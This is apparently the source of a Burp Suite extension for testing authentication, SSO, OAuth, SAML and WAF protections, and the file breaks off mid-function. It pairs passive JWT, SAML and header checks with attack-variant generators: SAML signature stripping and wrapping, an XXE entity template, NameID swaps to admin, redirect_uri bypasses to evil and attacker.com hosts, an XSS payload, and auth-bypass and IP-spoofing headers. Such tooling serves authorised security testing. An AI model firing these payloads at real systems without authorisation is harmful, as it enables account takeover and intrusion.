# -*- coding: utf-8 -*-
"""
Auth / SSO / OAuth / SAML / WSTG Tester — Burp Suite extension (Jython 2.7)
=============================================================================

Features:
- Automatic Population: Dynamically extracts and auto-populates all GUI fields across
  all tabs (Target/Login, Microsoft SSO/ADFS, OAuth/OIDC, SAML, WSTG, WAF) as traffic
  passes through Burp Proxy or Repeater.
- Full OAuth 2.0 / OIDC, SAML 2.0, OWASP WSTG, and WAF Bypass testing modules.
- Zero error display in Burp Suite with robust exception handling.
"""

import re
import json
import time
import base64
import random
import string
import zlib
import binascii

from burp import IBurpExtender, ITab, IHttpListener, IContextMenuFactory, IHttpService

from javax.swing import (JPanel, JButton, JLabel, JTextField, JPasswordField, JTabbedPane,
                          JScrollPane, JTable, JTextArea, JCheckBox, BoxLayout, JOptionPane,
                          JFileChooser, SwingUtilities, JSplitPane, JMenuItem)
from javax.swing.table import DefaultTableModel
from java.awt import GridLayout, BorderLayout, Dimension, Font
from java.util import ArrayList
from java.io import PrintWriter, File
from java.lang import Runnable


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def b64url_decode(s):
    try:
        s = str(s).replace('-', '+').replace('_', '/')
        pad = len(s) % 4
        if pad:
            s += '=' * (4 - pad)
        return base64.b64decode(s)
    except Exception:
        return ""


def rand_str(n=8):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


class SimpleHttpService(IHttpService):
    def __init__(self, host, port, protocol):
        self._host = host
        self._port = port
        self._protocol = protocol

    def getHost(self):
        return self._host

    def getPort(self):
        return self._port

    def getProtocol(self):
        return self._protocol


def parse_url(url):
    if not url:
        raise ValueError("URL cannot be empty")
    m = re.match(r'^(https?)://([^/:]+)(?::(\d+))?(/.*)?$', url.strip())
    if not m:
        raise ValueError("Bad URL format: %s" % url)
    protocol = m.group(1)
    host = m.group(2)
    port = int(m.group(3)) if m.group(3) else (443 if protocol == 'https' else 80)
    path = m.group(4) or '/'
    return protocol, host, port, path


def build_raw_request(method, path, host, headers, body=None, extra_query=None):
    if extra_query:
        sep = '&' if '?' in path else '?'
        path = path + sep + extra_query
    lines = ['%s %s HTTP/1.1' % (method, path), 'Host: %s' % host]
    hdrs = dict(headers or {})
    hdrs.setdefault('User-Agent', 'Mozilla/5.0 (AuthSSO-WSTG-Tester)')
    hdrs.setdefault('Accept', '*/*')
    hdrs.setdefault('Connection', 'close')
    if body:
        hdrs['Content-Length'] = str(len(body))
    for k, v in hdrs.items():
        lines.append('%s: %s' % (k, v))
    raw = '\r\n'.join(lines) + '\r\n\r\n'
    if body:
        raw += body
    return raw


def parse_query_or_body(text):
    params = {}
    if not text:
        return params
    if text.startswith('?'):
        text = text[1:]
    for pair in text.split('&'):
        if '=' in pair:
            k, v = pair.split('=', 1)
            params[k.strip()] = v.strip()
    return params


# ---------------------------------------------------------------------------
# JWT Analysis
# ---------------------------------------------------------------------------

JWT_RE = re.compile(r'eyJ[a-zA-Z0-9_\-]+?\.[a-zA-Z0-9_\-]+?\.[a-zA-Z0-9_\-]*')


def find_jwts(text):
    if not text:
        return []
    return list(set(JWT_RE.findall(text)))


def analyze_jwt(token):
    findings = []
    if not token:
        return findings
    parts = token.split('.')
    if len(parts) < 2:
        return [("info", "Not a 3-part JWT, skipped")]
    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception as e:
        return [("info", "Could not decode JWT header: %s" % e)]
    try:
        payload = json.loads(b64url_decode(parts[1])) if parts[1] else {}
    except Exception:
        payload = {}

    alg = header.get('alg', '')
    findings.append(("info", "alg=%s kid=%s" % (alg, header.get('kid'))))

    if str(alg).lower() == 'none':
        findings.append(("critical", "alg:none accepted -- test sending token with alg=none and empty signature."))
    if str(alg).upper().startswith('HS'):
        findings.append(("high", "HMAC algorithm (%s). Test for RSA/HMAC algorithm confusion if public key is known." % alg))
    if 'exp' not in payload:
        findings.append(("medium", "No 'exp' claim -- token may never expire."))
    else:
        try:
            remaining = int(payload['exp']) - int(time.time())
            findings.append(("info", "exp in %s seconds" % remaining))
        except Exception:
            pass
    if 'aud' not in payload:
        findings.append(("medium", "No 'aud' claim -- verify server restricts target audience."))
    if 'iss' not in payload:
        findings.append(("medium", "No 'iss' claim -- verify issuer pinning server-side."))
    if 'nbf' not in payload and 'iat' not in payload:
        findings.append(("low", "No nbf/iat -- missing timestamp freshness claims."))

    iss = str(payload.get('iss', ''))
    if 'login.microsoftonline.com' in iss or 'sts.windows.net' in iss:
        findings.append(("info", "Microsoft-issued token detected (iss=%s)" % iss))
        tid = payload.get('tid')
        if not tid:
            findings.append(("high", "No 'tid' (tenant id) claim -- potential cross-tenant impersonation."))
        else:
            findings.append(("info", "tid=%s -- confirm app restricts login to this tenant." % tid))
        if '/common/' in iss or iss.rstrip('/').endswith('/common'):
            findings.append(("high", "Issuer contains '/common/' -- multi-tenant endpoint used without tenant restriction."))
        ver = payload.get('ver')
        if ver:
            findings.append(("info", "token version=%s" % ver))
        idtyp = payload.get('idtyp')
        if idtyp == 'app':
            findings.append(("critical", "idtyp=app -- APP-ONLY token accepted on user endpoint (privilege confusion)."))

    findings.append(("info", "payload keys: %s" % ", ".join(sorted(payload.keys()))))
    return findings


# ---------------------------------------------------------------------------
# Advanced Microsoft Entra ID / OAuth / OIDC / SAML passive checks
# ---------------------------------------------------------------------------

MS_ISSUERS = ('login.microsoftonline.com', 'sts.windows.net')


def analyze_ms_token(token):
    """Deep decode/checks for Microsoft identity platform ID/access tokens."""
    out = []
    if not token:
        return out
    parts = token.split('.')
    if len(parts) != 3:
        return out
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        return out
    if 'login.microsoftonline.com' not in str(payload.get('iss', '')) and \
       'sts.windows.net' not in str(payload.get('iss', '')):
        return out

    alg = str(header.get('alg', ''))
    typ = str(header.get('typ', ''))
    kid = header.get('kid', '')
    out.append(('info', 'MS token: alg=%s typ=%s kid=%s ver=%s' % (alg, typ, kid, payload.get('ver', ''))))

    if not kid:
        out.append(('high', 'MS token has no kid; server must pin expected key and reject unsigned/unknown-key tokens.'))
    if alg.lower() == 'none':
        out.append(('critical', 'MS token uses alg=none. Test whether validation middleware accepts unsigned tokens.'))
    if alg.upper().startswith('HS'):
        out.append(('high', 'MS token uses HS%s; check whether a public key is incorrectly accepted as HMAC secret.' % alg))
    if alg not in ('RS256', 'ES256'):
        out.append(('high', 'Unexpected Microsoft token algorithm: %s.' % alg))

    if 'aud' not in payload:
        out.append(('critical', 'MS token has no aud claim; audience must be enforced server-side.'))
    if 'iss' not in payload:
        out.append(('critical', 'MS token has no iss claim; issuer pinning must be enforced server-side.'))
    if 'exp' not in payload:
        out.append(('critical', 'MS token has no exp claim; expiry must be enforced server-side.'))
    if 'nbf' not in payload:
        out.append(('medium', 'MS token has no nbf claim; not-before validation is absent or nonstandard.'))
    if 'iat' not in payload:
        out.append(('low', 'MS token has no iat claim; issuance time is unavailable for freshness checks.'))

    iss = str(payload.get('iss', ''))
    tid = payload.get('tid')
    if tid:
        out.append(('info', 'MS token tid=%s. If app is single tenant, ensure server rejects any other tid.' % tid))
        if '/common/' in iss or '/organizations/' in iss or '/consumers/' in iss:
            out.append(('high', 'MS token issued from multi-tenant endpoint (%s). Server must allowlist tid/iss.' % iss))
    else:
        out.append(('high', 'MS token has no tid claim. For multi-tenant apps, enforce tenant allowlisting using oid/upn/appid context.'))

    aud = str(payload.get('aud', ''))
    if typ.lower().startswith('jwt') or typ == '':
        if '00000003-0000-0000-c000-000000000000' in aud:
            out.append(('info', 'Access token audience is Microsoft Graph. It should not be accepted by a custom app API.'))
    if 'scp' in payload:
        out.append(('info', 'Delegated permissions scp=%s. Check server maps every requested scope to real authorization.' % payload.get('scp')))
    if 'roles' in payload:
        out.append(('info', 'App roles present: %s. Verify server treats roles as authorization claims, not client-controlled input.' % payload.get('roles')))

    idtyp = payload.get('idtyp')
    appidacr = payload.get('appidacr')
    if idtyp == 'app' or appidacr == '1':
        out.append(('high', 'App-only/service principal token detected (idtyp=%s appidacr=%s). Confirm user-facing API rejects it.' % (idtyp, appidacr)))
    if 'idtyp' in payload and payload.get('idtyp') not in ('user', 'app', 'group', 'device'):
        out.append(('medium', 'Unexpected idtyp=%s; token-type validation may be weak.' % idtyp))

    if 'azp' in payload and 'appid' in payload and payload.get('azp') != payload.get('appid'):
        out.append(('medium', 'azp (%s) differs from appid (%s); verify the authorized party is explicitly trusted.' % (payload.get('azp'), payload.get('appid'))))
    if 'nonce' not in payload:
        out.append(('medium', 'No nonce claim. If this is an ID token, nonce must be bound to the client session and verified.'))
    if 'amr' in payload:
        out.append(('info', 'Authentication methods amr=%s. Check MFA requirement and mfa_auth_time handling.' % payload.get('amr')))
    if 'xms_tcdt' in payload:
        out.append(('info', 'Tenant creation timestamp xms_tcdt=%s present.' % payload.get('xms_tcdt')))
    if 'acrs' in payload and payload.get('acrs'):
        out.append(('info', 'Authentication context acrs=%s. Confirm API enforces required step-up claim.' % payload.get('acrs')))

    try:
        now = int(time.time())
        exp = int(payload.get('exp'))
        if exp <= now:
            out.append(('info', 'Observed token is expired; verify backend rejects it rather than relying on browser session.'))
        else:
            out.append(('info', 'Token expires in %d seconds.' % (exp - now)))
    except Exception:
        pass
    return out


def check_oauth_request(url, params):
    """Passive OAuth/OIDC authorization-request checks."""
    findings = []
    if not params:
        return findings
    has_client_id = 'client_id' in params
    has_response_type = 'response_type' in params
    if not (has_client_id and has_response_type):
        return findings

    rtype = str(params.get('response_type', '')).lower()
    if 'token' in rtype:
        findings.append(('high', 'OAuth implicit flow requested (response_type=%s). Tokens in URL fragments are exposed to browser history/Referer.' % rtype))
    if 'none' in rtype:
        findings.append(('medium', 'response_type=none requested; confirm this flow is intentionally disabled.'))
    if 'code' in rtype:
        if 'state' not in params:
            findings.append(('high', 'OAuth authorization request has no state parameter; login CSRF protection missing.'))
        if 'code_challenge' not in params:
            findings.append(('high', 'OAuth code flow lacks PKCE code_challenge; authorization-code interception risk.'))
        elif str(params.get('code_challenge_method', '')).lower() not in ('s256', ''):
            findings.append(('high', 'PKCE method is not S256 (%s); accept only S256.' % params.get('code_challenge_method')))
        elif 'code_challenge_method' not in params:
            findings.append(('medium', 'code_challenge present but code_challenge_method missing; server may default to weak/plain.'))
    if 'id_token' in rtype and 'nonce' not in params:
        findings.append(('critical', 'OIDC ID-token flow requested without nonce; replay/binding protection missing.'))

    redirect_uri = str(params.get('redirect_uri', ''))
    if redirect_uri:
        if redirect_uri.lower().startswith('http://'):
            findings.append(('high', 'OAuth redirect_uri uses HTTP: %s' % redirect_uri))
        if '*' in redirect_uri:
            findings.append(('high', 'OAuth redirect_uri contains wildcard: %s' % redirect_uri))
        if '@' in redirect_uri.split('//', 1)[-1].split('/', 1)[0]:
            findings.append(('high', 'OAuth redirect_uri includes userinfo (@) segment; possible parser confusion.'))
        if any(x in redirect_uri.lower() for x in ('/../', '/../../', '%2f..%2f', '%252f')):
            findings.append(('high', 'OAuth redirect_uri includes traversal/overlong encoding: %s' % redirect_uri))
    else:
        findings.append(('medium', 'OAuth request has no redirect_uri; verify server requires an exact registered URI.'))

    scope = str(params.get('scope', '')).lower()
    if 'offline_access' in scope:
        findings.append(('medium', 'offline_access requested; ensure refresh-token issuance is intentional and scoped.'))
    if 'admin' in scope or '.default' in scope:
        findings.append(('medium', 'High-privilege/default scope requested (%s); verify least privilege.' % scope))

    u = url.lower()
    if '/common/' in u or '/organizations/' in u or '/consumers/' in u:
        findings.append(('high', 'Microsoft multi-tenant endpoint used; enforce tid/iss allowlisting after token validation.'))
    if 'prompt=none' in (url + '&' + '&'.join('%s=%s' % (k, v) for k, v in params.items())).lower():
        findings.append(('info', 'prompt=none request seen; useful for silent-login/SSO behavior review.'))
    return findings


def analyze_saml_xml(xml):
    """Passive SAML configuration/structure checks."""
    out = []
    if not xml or '<' not in xml:
        return out
    low = xml.lower()
    if 'doctype' in low or 'entity' in low:
        out.append(('high', 'SAML XML contains DOCTYPE/entity markup; parser must disable DTD/external entities (XXE).'))
    if '<!--' in xml:
        out.append(('medium', 'SAML XML contains comments; verify parser does not allow comment-aware NameID truncation.'))

    response_sigs = len(re.findall(r'<(?:\w+:)?Response\b[^>]*>(?:(?!<Assertion).*?)<(?:\w+:)?Signature\b', xml, re.S | re.I))
    assertions = re.findall(r'<(?:\w+:)?Assertion\b.*?</(?:\w+:)?Assertion>', xml, re.S | re.I)
    if not assertions:
        out.append(('medium', 'No SAML Assertion found in decoded message.'))
    else:
        signed_assertions = 0
        for a in assertions:
            if re.search(r'<(?:\w+:)?Signature\b', a, re.I):
                signed_assertions += 1
        if signed_assertions == 0 and response_sigs == 0:
            out.append(('critical', 'Neither SAML Response nor Assertion is signed.'))
        elif signed_assertions == 0:
            out.append(('high', 'Assertion is unsigned; only Response signature observed. Require assertion signature or validate exact signature/reference coverage.'))
        else:
            out.append(('info', 'Assertion signature present (%d/%d assertions).' % (signed_assertions, len(assertions))))

    if not re.search(r'<(?:\w+:)?AudienceRestriction\b.*?</(?:\w+:)?AudienceRestriction>', xml, re.S | re.I):
        out.append(('high', 'No AudienceRestriction found; token/SP audience binding may be missing.'))
    audience = re.search(r'<(?:\w+:)?Audience\b[^>]*>(.*?)</(?:\w+:)?Audience>', xml, re.S | re.I)
    if audience:
        out.append(('info', 'Audience claim: %s. Verify exact match with SP Entity ID.' % audience.group(1).strip()))
    else:
        out.append(('high', 'No Audience element found.'))

    recipient = re.search(r'(?:Recipient|Destination)="([^"]+)"', xml, re.I)
    if recipient:
        out.append(('info', 'Recipient/Destination: %s. Verify exact match with ACS endpoint and HTTPS scheme.' % recipient.group(1)))
        if recipient.group(1).lower().startswith('http://'):
            out.append(('high', 'Recipient/Destination uses HTTP: %s.' % recipient.group(1)))
    else:
        out.append(('medium', 'No Recipient/Destination attribute found; ACS binding should be explicit.'))

    not_before = re.search(r'NotBefore="([^"]+)"', xml)
    not_on_or_after = re.search(r'NotOnOrAfter="([^"]+)"', xml)
    if not_on_or_after:
        out.append(('info', 'Assertion NotOnOrAfter=%s; verify short lifetime and server clock skew.' % not_on_or_after.group(1)))
    else:
        out.append(('critical', 'No NotOnOrAfter condition; assertion lifetime may be unlimited.'))
    if not not_before:
        out.append(('medium', 'No NotBefore condition; freshness validation may be incomplete.'))

    ids = re.findall(r'(?:\w+:)?Assertion\b[^>]*\bID="([^"]+)"', xml, re.I)
    if len(ids) != len(set(ids)):
        out.append(('high', 'Duplicate Assertion IDs found; replay protection and XML parser behavior must be reviewed.'))
    if not re.search(r'<(?:\w+:)?Issuer\b[^>]*>([^<]+)</(?:\w+:)?Issuer>', xml, re.I):
        out.append(('high', 'No Issuer element; SP must validate IdP entity ID.'))

    nameid = re.search(r'<(?:\w+:)?NameID\b([^>]*)>(.*?)</(?:\w+:)?NameID>', xml, re.S | re.I)
    if nameid:
        out.append(('info', 'NameID=%s format=%s. Verify immutable identifier handling.' % (nameid.group(2).strip(), (nameid.group(1).strip() or 'unspecified'))))
    else:
        out.append(('medium', 'No NameID element found; identity mapping should be explicit.'))

    if re.search(r'InResponseTo', xml, re.I):
        out.append(('info', 'InResponseTo present; SP must bind response to outstanding AuthnRequest.'))
    else:
        out.append(('medium', 'No InResponseTo attribute; if IdP-initiated SSO is allowed, review CSRF/login-CSRF controls.'))
    return out


def check_sso_session_headers(headers_text, cookies_text):
    out = []
    low = (headers_text or '').lower()
    if 'cache-control' not in low:
        out.append(('medium', 'Authenticated/SSO response has no Cache-Control header; add no-store, no-cache, must-revalidate.'))
    elif 'no-store' not in low:
        out.append(('medium', 'Cache-Control lacks no-store on authenticated/SSO response.'))
    if 'strict-transport-security' not in low:
        out.append(('low', 'No Strict-Transport-Security header on SSO/auth response.'))
    if 'x-content-type-options' not in low:
        out.append(('low', 'No X-Content-Type-Options: nosniff header on SSO/auth response.'))
    for line in re.findall(r'(?im)^Set-Cookie:\s*(.+)$', cookies_text or ''):
        name = line.split('=', 1)[0].strip()
        flags = line.lower()
        missing = []
        if 'secure' not in flags:
            missing.append('Secure')
        if 'httponly' not in flags:
            missing.append('HttpOnly')
        if 'samesite' not in flags:
            missing.append('SameSite')
        if missing:
            out.append(('medium', 'Cookie %s missing flags: %s.' % (name, ', '.join(missing))))
    return out

# ---------------------------------------------------------------------------
# SAML helpers
# ---------------------------------------------------------------------------

def saml_decode(raw_value, redirect_binding=False):
    if not raw_value:
        return ""
    data = base64.b64decode(raw_value)
    if redirect_binding:
        data = zlib.decompress(data, -15)
    return data.decode('utf-8', 'replace')


def saml_encode(xml_text, redirect_binding=False):
    if not xml_text:
        return ""
    data = xml_text.encode('utf-8')
    if redirect_binding:
        co = zlib.compressobj(6, zlib.DEFLATED, -15)
        data = co.compress(data) + co.flush()
    return base64.b64encode(data)


def gen_saml_variants(xml_text):
    variants = []
    if not xml_text:
        return variants

    v1 = re.sub(r'<(\w+:)?Signature\b.*?</(\w+:)?Signature>', '', xml_text, flags=re.S)
    if v1 != xml_text:
        variants.append(("sig-stripped", "Remove entire <Signature> block.", v1, "If accepted, signature validation is missing."))

    v2 = re.sub(r'(<(\w+:)?SignatureValue[^>]*>)([^<]*)(</(\w+:)?SignatureValue>)', r'\1\4', xml_text)
    if v2 != xml_text:
        variants.append(("sig-value-blanked", "Keep <Signature> structure but empty SignatureValue.", v2, "If accepted, signature verification is bypassed."))

    v3 = re.sub(r'(<(\w+:)?NameID\b[^>]*>)([^<]*)(</(\w+:)?NameID>)', r'\g<1>admin@internal.local\g<4>', xml_text, count=1)
    if v3 != xml_text:
        variants.append(("nameid-swap", "Swap NameID to admin@internal.local.", v3, "If accepted, account takeover occurs."))

    def _bump(m):
        return m.group(1) + '2099-01-01T00:00:00Z' + m.group(3)
    v4 = re.sub(r'(NotOnOrAfter=")([^"]+)(")', _bump, xml_text)
    if v4 != xml_text:
        variants.append(("expiry-extended", "Extend NotOnOrAfter to year 2099.", v4, "If accepted, lifetime restriction is weak."))

    m = re.search(r'(<(\w+:)?Assertion\b.*?</(\w+:)?Assertion>)', xml_text, flags=re.S)
    if m:
        original_assertion = m.group(1)
        cloned = re.sub(r'(<(\w+:)?NameID\b[^>]*>)([^<]*)(</(\w+:)?NameID>)', r'\g<1>admin@internal.local\g<4>', original_assertion, count=1)
        cloned = re.sub(r'<(\w+:)?Signature\b.*?</(\w+:)?Signature>', '', cloned, flags=re.S)
        cloned_alt_id = re.sub(r'ID="[^"]+"', 'ID="_attacker_assertion_999"', cloned, count=1)

        xsw1_body = cloned + original_assertion
        v5 = xml_text.replace(original_assertion, xsw1_body, 1)
        variants.append(("xsw1-clone-before", "XSW-1: Attacker unsigned Assertion placed before original signed Assertion.", v5, "Vulnerable to XSW-1."))

        xsw2_body = original_assertion + cloned_alt_id
        v6 = xml_text.replace(original_assertion, xsw2_body, 1)
        variants.append(("xsw2-clone-after-new-id", "XSW-2: Attacker unsigned Assertion with modified ID appended after original.", v6, "Vulnerable to XSW-2."))

    v_comment = re.sub(r'(<(\w+:)?NameID\b[^>]*>)([^<@]+)(@[^<]+)(</(\w+:)?NameID>)', r'\g<1>\g<3><!--comment-->\g<4>\g<5>', xml_text, count=1)
    if v_comment != xml_text:
        variants.append(("saml-comment-injection", "Inject XML comment inside NameID.", v_comment, "Vulnerable to XML comment truncation."))

    v_aud = re.sub(r'(<(\w+:)?Audience\b[^>]*>)([^<]*)(</(\w+:)?Audience>)', r'\g<1>https://attacker.com/saml/sp\g<4>', xml_text)
    if v_aud != xml_text:
        variants.append(("saml-audience-swap", "Swap Audience restriction URL.", v_aud, "Audience restriction bypass."))

    v_rec = re.sub(r'Recipient="[^"]+"', 'Recipient="https://attacker.com/saml/acs"', xml_text)
    if v_rec != xml_text:
        variants.append(("saml-recipient-swap", "Swap SubjectConfirmationData Recipient URL.", v_rec, "Recipient bypass."))

    if '<?xml' in xml_text:
        v_xxe = xml_text.replace('<?xml version="1.0"?>', '<?xml version="1.0"?>\n<!DOCTYPE saml [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/xxe">]>', 1)
        if v_xxe == xml_text:
            v_xxe = '<!DOCTYPE saml [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/xxe">]>\n' + xml_text
        variants.append(("saml-xxe-template", "Insert DTD entity definition for XXE.", v_xxe, "Vulnerable to XXE."))

    return variants


# ---------------------------------------------------------------------------
# OAuth / OIDC variant generation
# ---------------------------------------------------------------------------

def gen_oauth_variants(authorize_url, redirect_uri, client_id, scope, extra_params):
    protocol, host, port, path = parse_url(authorize_url)
    base_q = extra_params or {}

    def mk(name, desc, overrides, expectation):
        q = dict(base_q)
        q['client_id'] = client_id
        q['scope'] = scope
        q.update(overrides)
        query_parts = []
        for k, v in q.items():
            if v is not None:
                query_parts.append('%s=%s' % (k, v))
        query = '&'.join(query_parts)
        return (name, desc, protocol, host, port, path, query, expectation)

    variants = []
    variants.append(mk("redirect_uri-subdomain", "Try sibling/attacker subdomain of redirect_uri.", {"redirect_uri": redirect_uri.replace("://", "://evil.")}, "Redirect URI validation bypass."))
    variants.append(mk("redirect_uri-at-trick", "Embed legitimate host as userinfo segment.", {"redirect_uri": redirect_uri.replace("https://", "https://" + host + "@")}, "Userinfo redirect bypass."))
    variants.append(mk("redirect_uri-path-traversal", "Append path traversal suffix to redirect_uri.", {"redirect_uri": redirect_uri.rstrip('/') + "/../../evil"}, "Path traversal bypass."))
    variants.append(mk("redirect_uri-double-encoding", "Double URL-encode path separators in redirect_uri.", {"redirect_uri": redirect_uri.replace("/", "%252f")}, "Double encoding bypass."))
    variants.append(mk("redirect_uri-http-downgrade", "Downgrade scheme to http:// in redirect_uri.", {"redirect_uri": redirect_uri.replace("https://", "http://")}, "HTTP downgrade leakage."))
    variants.append(mk("response_type-token", "Force deprecated implicit flow (response_type=token).", {"response_type": "token", "redirect_uri": redirect_uri}, "Implicit flow enabled."))
    variants.append(mk("response_type-hybrid", "Force hybrid flow (response_type=code id_token token).", {"response_type": "code id_token token", "redirect_uri": redirect_uri}, "Hybrid flow enabled."))
    variants.append(mk("response_type-none", "Set response_type=none.", {"response_type": "none", "redirect_uri": redirect_uri}, "State tracking bypass."))
    variants.append(mk("state-omitted", "Omit state parameter entirely.", {"redirect_uri": redirect_uri, "response_type": "code", "state": None}, "Login CSRF vulnerability."))
    variants.append(mk("pkce-omitted", "Omit code_challenge/code_challenge_method (PKCE downgrade).", {"redirect_uri": redirect_uri, "response_type": "code"}, "PKCE omitted vulnerability."))
    variants.append(mk("pkce-plain-downgrade", "Downgrade code_challenge_method to 'plain'.", {"redirect_uri": redirect_uri, "response_type": "code", "code_challenge": "plain_test_challenge", "code_challenge_method": "plain"}, "PKCE plain downgrade."))
    variants.append(mk("scope-escalation", "Request broader scope.", {"redirect_uri": redirect_uri, "scope": scope + " offline_access profile email admin"}, "Scope escalation."))
    return variants


def gen_ms_oauth_variants(tenant, client_id, redirect_uri, scope, use_v2=True):
    variants = []

    def authorize_url(t):
        if use_v2:
            return "https://login.microsoftonline.com/%s/oauth2/v2.0/authorize" % t
        return "https://login.microsoftonline.com/%s/oauth2/authorize" % t

    def mk(name, desc, t, overrides, expectation):
        q = {"client_id": client_id, "scope": scope, "response_type": "code", "redirect_uri": redirect_uri}
        q.update(overrides)
        protocol, host, port, path = parse_url(authorize_url(t))
        query_parts = []
        for k, v in q.items():
            if v is not None:
                query_parts.append('%s=%s' % (k, v))
        query = '&'.join(query_parts)
        return (name, desc, protocol, host, port, path, query, expectation)

    variants.append(mk("tenant-confusion-common", "Swap specific tenant for /common/.", "common", {}, "Cross-tenant account takeover."))
    variants.append(mk("tenant-confusion-consumers", "Force /consumers/ endpoint.", "consumers", {}, "Personal account access allowed."))
    variants.append(mk("nonce-omitted", "Request id_token without nonce.", tenant, {"response_type": "id_token", "scope": "openid " + scope, "response_mode": "fragment"}, "Replay protection missing."))
    variants.append(mk("prompt-none-silent-auth", "Check prompt=none silent authentication.", tenant, {"prompt": "none"}, "Silent session detection."))
    variants.append(mk("redirect_uri-wildcard-subdomain", "Try sibling dev/qa subdomain.", tenant, {"redirect_uri": redirect_uri.replace("://", "://qa-")}, "Wildcard redirect allowed."))

    admin_consent = ("adminconsent", "Direct call to /adminconsent endpoint.", "https" ,"login.microsoftonline.com", 443, "/%s/adminconsent" % tenant, "client_id=%s&redirect_uri=%s" % (client_id, redirect_uri), "Admin consent screen review.")
    variants.append(admin_consent)
    return variants


def gen_wsfed_variants(adfs_base_url, wtrealm, wreply):
    protocol, host, port, path = parse_url(adfs_base_url.rstrip('/') + '/adfs/ls/')
    variants = []

    def mk(name, desc, overrides, expectation):
        q = {"wa": "wsignin1.0", "wtrealm": wtrealm, "wreply": wreply}
        q.update(overrides)
        query = '&'.join('%s=%s' % (k, v) for k, v in q.items() if v is not None)
        return (name, desc, protocol, host, port, path, query, expectation)

    variants.append(mk("wreply-host-mismatch", "Change wreply host.", {"wreply": wreply.replace("://", "://evil.")}, "Token redirect off-domain."))
    variants.append(mk("wtrealm-swap-same-reply", "Point wtrealm at non-existent party.", {"wtrealm": wtrealm.rstrip('/') + '/evil'}, "RP trust matching loose."))
    variants.append(mk("wctx-injection", "Inject XSS payload into wctx parameter.", {"wctx": "<script>alert(1)</script>"}, "Reflected XSS in ADFS flow."))
    return variants


# ---------------------------------------------------------------------------
# WSTG Checks
# ---------------------------------------------------------------------------

def check_wstg_password_policy(password):
    findings = []
    if not password:
        return [("info", "WSTG-ATHN-07: Password empty or not provided.")]
    if len(password) < 8:
        findings.append(("medium", "WSTG-ATHN-07: Password length is less than 8 characters."))
    if not re.search(r'[A-Z]', password):
        findings.append(("low", "WSTG-ATHN-07: Password lacks uppercase letters."))
    if not re.search(r'[0-9]', password):
        findings.append(("low", "WSTG-ATHN-07: Password lacks numeric digits."))
    if not re.search(r'[^a-zA-Z0-9]', password):
        findings.append(("low", "WSTG-ATHN-07: Password lacks special characters."))
    return findings


def check_wstg_auth_headers(url, status_code, headers_text):
    findings = []
    if not url:
        return findings
    if url.lower().startswith("http://"):
        findings.append(("high", "WSTG-ATHN-01: Auth/SSO request sent over unencrypted HTTP!"))

    headers_lower = (headers_text or "").lower()
    url_lower = url.lower()
    if any(k in url_lower for k in ['login', 'auth', 'oauth', 'saml', 'token', 'password', 'session', 'account']):
        if 'cache-control' not in headers_lower or 'no-store' not in headers_lower:
            findings.append(("medium", "WSTG-ATHN-06: Sensitive auth response missing 'Cache-Control: no-store'."))
        if 'pragma' not in headers_lower or 'no-cache' not in headers_lower:
            findings.append(("low", "WSTG-ATHN-06: Sensitive auth response missing 'Pragma: no-cache'."))
    return findings


def gen_wstg_auth_bypass_headers(method, path, host, headers, body):
    variants = []
    header_sets = [
        ("wstg-auth-x-forwarded-user", {"X-Forwarded-User": "admin"}),
        ("wstg-auth-x-remote-user", {"X-Remote-User": "admin@internal.local"}),
        ("wstg-auth-x-original-url", {"X-Original-URL": "/admin"}),
        ("wstg-auth-x-custom-auth", {"X-Custom-Auth-User": "admin"}),
        ("wstg-auth-x-user-id", {"X-User-Id": "1"}),
        ("wstg-auth-x-role", {"X-Role": "Administrator"}),
        ("wstg-auth-x-authenticated-user", {"X-Authenticated-User": "admin"}),
    ]
    for name, extra_h in header_sets:
        h_copy = dict(headers or {})
        h_copy.update(extra_h)
        variants.append((name, method, path, host, h_copy, body, "WSTG-ATHN-04: Header-based authentication bypass."))
    return variants


def gen_wstg_authz_variants(method, path, host, headers, body):
    variants = []
    if body and ('role=' in body or 'user_type=' in body or 'is_admin=' in body or 'group=' in body):
        b_admin = body
        b_admin = re.sub(r'role=[^&]+', 'role=admin', b_admin)
        b_admin = re.sub(r'user_type=[^&]+', 'user_type=administrator', b_admin)
        b_admin = re.sub(r'is_admin=[^&]+', 'is_admin=true', b_admin)
        b_admin = re.sub(r'group=[^&]+', 'group=admin', b_admin)
        variants.append(("wstg-privesc-role-admin", method, path, host, dict(headers or {}), b_admin, "WSTG-ATHZ-03: Parameter tampering privilege escalation."))

    target_str = (path or "") + ("?" + body if body else "")
    m = re.search(r'(user[_-]?id|account[_-]?id|org[_-]?id|profile[_-]?id|id)=(\d+)', target_str, re.I)
    if m:
        param_name = m.group(1)
        orig_val = int(m.group(2))
        new_val = orig_val + 1 if orig_val > 0 else 1
        new_path = re.sub(r'(%s=)\d+' % param_name, r'\g<1>%d' % new_val, path, flags=re.I)
        new_body = re.sub(r'(%s=)\d+' % param_name, r'\g<1>%d' % new_val, body, flags=re.I) if body else body
        variants.append(("wstg-idor-id-increment", method, new_path, host, dict(headers or {}), new_body, "WSTG-ATHZ-04: IDOR parameter increment."))

    admin_paths = ["/admin", "/api/admin", "/management", "/actuator/health", "/api/v1/users"]
    for ap in admin_paths:
        variants.append(("wstg-authz-admin-path-%s" % ap.replace('/', '_').strip('_'), "GET", ap, host, dict(headers or {}), None, "WSTG-ATHZ-02: Direct access to admin path %s." % ap))

    return variants


def gen_waf_bypass_variants(method, path, host, headers, body):
    variants = []
    h1 = dict(headers or {})
    h1['X-Forwarded-For'] = '127.0.0.1'
    h1['X-Originating-IP'] = '127.0.0.1'
    h1['X-Remote-IP'] = '127.0.0.1'
    h1['X-Client-IP'] = '127.0.0.1'
    variants.append(("spoofed-internal-ip-headers", method, path, host, h1, body))

    h2 = dict(headers or {})
    h2['X-HTTP-Method-Override'] = method
    variants.append(("verb-override-as-GET", 'GET' if method != 'GET' else 'POST', path, host, h2, body))

    def rand_case(s):
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
    p3 = '/'.join(rand_case(seg) if seg else seg for seg in path.split('/'))
    variants.append(("path-case-randomized", method, p3, host, dict(headers or {}), body))

    if '/' in path.rstrip('/'):
        segs = path.rstrip('/').split('/')
